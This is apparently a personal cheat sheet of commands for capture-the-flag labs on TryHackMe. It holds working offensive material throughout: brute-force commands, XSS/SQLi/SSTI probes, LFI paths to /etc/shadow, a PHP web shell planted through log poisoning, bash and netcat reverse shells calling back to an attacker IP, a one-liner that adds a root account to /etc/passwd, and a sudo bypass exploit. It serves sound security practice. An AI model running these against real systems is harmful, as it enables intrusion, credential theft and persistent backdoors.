# Common CTF References

## Kali box setup
tryhackme virtual box do not have pip installed.
```
sudo apt install python3-pip
```

install gobuster as well
```
sudo apt-get install gobuster
```

- Install webapplyzer browser add on.
- Setup Burpsuite and foxyproxy.
- download impacket
```
git clone https://github.com/SecureAuthCorp/impacket.git
```

## OpenVPN Setup for THM
1. Install OpenVPN

```
sudo apt install openvpn
```

2. Run Openvpn

```
sudo openvpn /path-to-file/file-name.ovpn
```

## IP setup

note that in this script below, I made an assumption that you have assigned ```IP``` to the target's IP address:
```bash
export IP=<ip address>
```

Assigning IP address to url

```
echo "<ip> team.thm" >> /etc/hosts
```

## Nmap ( 0 - 65535)
Normal full port scan:
```bash
nmap -sC -sV -p- -oN <file directory> $IP
```

Nmap scanning samba ports:
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

Nmap scanning for vulnerability script:
```bash
nmap $IP --script=/usr/share/nmap/scripts/vulners.nse -sV
```

## Identifying hash
```bash
hash-identifier
#after you load key in the hash value
```


## Nikto
```bash
nikto -h $IP
```

##  Gobuster

Normal medium wordlist directory scan:
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Scanning with extensions example ```php``` and ```txt```:
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
```

## Samba
Through Nmap:
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

Through enum4linux:
```bash
enum4linux -A $IP
```

Accessing Samba:
```bash
smbclient //$IP/[SHARE]
```

With user and port add:
```
-U [name] : to specify the user

-p [port] : to specify the port
```

## SSH with id_rsa
1. First you need to set the id_rsa permission first
```
chmod 600 id_rsa
```

2. Then try logging in with the id_rsa
```
ssh -i id_rsa <username>@<ipaddress>
```

3. If id_rsa is passcode protected you will need to run ```john``` to try decrypt the password (assuming weak passcode).
```
# make id_rsa readable to john format
/usr/share/john/ssh2john.py id_rsa > id_rsa.john

# bruteforce password with rockyou
sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
```

## Downloading/Uploading File Thru SSH

```
scp -i id_rsa <file_you_wanna_upload/download> <username>@<ipaddress>:<path/to/file-to-upload-or-download>
```

## Telnet
Accessing Telnet:
```bash
telnet $IP [port]
```

## FTP
[FTP pentest article](https://book.hacktricks.xyz/pentesting/pentesting-ftp)

bruteforce works too:
```
hydra -t 4 -l <user> -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

OR

root@kali:~/Downloads# ncrack --user "ftpuser" -P passwords.txt ftp://10.10.145.113
```

Simple FTP syntax
```
lcd <set your download directory>
get file
put file
mget *
mget *.txt
```

## Simple SQLi, XSS & SSTI Payload Syntax

```
'"><svg/onload=prompt(5);>{{7*7}}
'"><svg/onload=prompt(document.domain);>{{5*5}}
```

'"><svg/onload=prompt(5);>{{7*7}}

' ==> for Sql injection 

"><svg/onload=prompt(5);> ==> for XSS 

{{7*7}} ==> for SSTI/CSTI

## Simple LFI

To read file
```
http://host.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
```

Simple traversing
```
http://host.thm/test.php?view=../../../etc/shadow
```

Reverse Shell with User Agent in Burpsuite
```
#add this in useragent
<?php system($_GET['cmd']); ?>

#then in url add
test.php/?view=access.log$cmd=ls

#wget revshell php and exec
```

## Hydra Brute-Forcing
With known user and unknown password:
```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

with unknown user and unknown password:
```bash
hydra -l /path/to/user/list -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

force http-get
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 3000 -f $IP http-get /<address>

#example
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f inferno.thm http-get /inferno/ -t 64
```

wordpress or any http post request
```
hydra -L lists/usrname.txt -P lists/pass.txt <wp site address> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

## Sample Hashcat Brute-Forcing
```bash
hashcat -D 1 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --force
```
```bash
hashcat -m <hash table from hashcat> -a 0 -o <output file> <hash file> <wordlist> --force
#0 is dictionary attack
```

## Sample John The Ripper Brute-Forcing
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

## Decode Base Encoded Text

Use Base Crack

```
$ git clone https://github.com/mufeedvh/basecrack.git
$ cd basecrack
$ pip install -r requirements.txt
$ python basecrack.py -h
```

## Finding out Encryption Type

Use ```hash-identifier``` preinstalled in kali.

## SQLmap
```bash
sqlmap -u $IP
```

if you know the database type
```bash
sqlmap -u $IP --dbms==sqlite --dump
```
## Making a Python HTTP Server

```
python -m SimpleHTTPServer <port>
```

OR

```
sudo python3 -m http.server <port>
```

## Reverse Shell

[Pentestmonkey's php reverse shell](https://github.com/pentestmonkey/php-reverse-shell)

- Remember to change the IP address and port in the php script

- [Renaming reverse shell ext](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)

- If you can upload a php, you can create a interactive php shell page. Download the php from [artyuum](https://github.com/artyuum/Simple-PHP-Web-Shell)

- One line bash create own root account in /etc/passwd
```
echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
```

- One line bash reverse shell
```
bash -i >& /dev/tcp/your_thm_ip/some_port_to_listen_on 0>&1;
```
- One line rm reverse shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.5.198 8888 >/tmp/f
```

## Netcat
```
nc -lvpn <port>
```

## Stablising Shell
- type the following:
```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

OR

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- press ```ctrl+z``` to bring shell to foreground

- type:
```bash
stty raw -echo
fg
```

- press ```Enter``` a few times to get back the shell

- type:
```bash
export TERM=xterm
```

- press ```crtl+l``` to get a clean and stable shell.

- if anything went wrong. you can always cmd ```reset```.
- then if will ask for terminal and you can try ```xterm``` or ```xterm-256color```.
- you can type ```stty -a``` to see your own shell's rows and col then resize it ```stty rows <number>; stty cols <number>```

## Another 2 ways to stablise shell
1. For Windows mainly but work well with Linux
```
sudo apt install rlwrap
rlwrap nc -lvnp <port>

# crtl z -> stty raw -echo; fg to stablise linux
```

2. Use ```socat``` for linux.
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

## Searchsploit

the result of searchsploit starts from path ```/usr/share/exploitdb/exploits/```

## Finding Exploit For Privilege Escalation

1. You can type ```sudo -l``` to see if any sudo permission is given.

2. you can use ```find / -perm -u=s -type f 2>/dev/null``` to find exploit files to run without ```sudo```. SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues. Below show a normal suid list
```
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/bin/at
/usr/bin/chfn
```

- if SUID bits has setcap, read this [article](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) for privesc with python. Or go to GTFObin and find a capabilities that allows privesc and use the same technique.

3. you get find possible escalation scripts at [GTFObins](https://gtfobins.github.io/)

4. [CVE-2019-14287 user sudo -u#-1](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/)
```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
    
#you can run the following below as sudo
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/chmod

# you can run
sudo -u#-1 /usr/bin/chmod
```
- Follow GTFO to escalate the ```bin/sh```

5. if all else fails, try linpeas.sh

6. If linpeas shows nothing... try searching for active database or database locations in the server.

## Additional method on privesc
1. [page](https://wiki.thehacker.nz/docs/thm-writeups/road-medium/) - Escalate through pkexec when user has sudo in group.
2. [page](https://classroom.anir0y.in/post/tryhackme-road/) - sudo -l shows ```LD_PRELOAD``` available.
3. [page](https://www.exploit-db.com/exploits/50689) - polkit escalation. vi evil-so.c, vi exploit.c, follow makefile cmd type out 1 by1 and run ./exploit

## Recommended Burpsuite Additional Module Copy As Python-Requests
1. Go to ```Extender``` Tab
2. Under ```BApp Store``` Tab
3. Search for ```Copy As Python-Requests```
4. This allows you to change the get or post requests into a python format when you right click on the ```intercept``` response and choose ```Copy As Python-Requests```
5. Good for python scripting.
